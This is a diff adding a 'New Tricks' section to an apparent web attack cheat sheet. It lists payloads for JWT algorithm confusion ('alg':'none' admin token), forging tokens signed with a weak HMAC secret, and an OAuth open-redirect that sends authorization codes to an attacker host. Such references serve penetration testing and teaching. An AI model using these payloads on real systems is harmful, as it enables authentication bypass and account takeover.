@@ -199,3 +199,16 @@ This attack targets the XML parser's ability to process **eXtensible Stylesheet 
 
 ---
 
+## New Tricks
+
+### Trick 1
+- Scenario: Algorithm confusion accepted unsigned token and escalated role.
+- Payload: `{"alg":"none","typ":"JWT"}.{"sub":"1","role":"admin"}.`
+
+### Trick 2
+- Scenario: Weak HMAC secret cracked, then forged admin session token.
+- Payload: `jwt payload: {"sub":"1","role":"admin"} signed with secret "secret123"`
+
+### Trick 3
+- Scenario: OAuth redirect accepted open redirect and captured authorization code.
+- Payload: `redirect_uri=https://trusted.tld/cb?next=https://attacker.tld/capture`
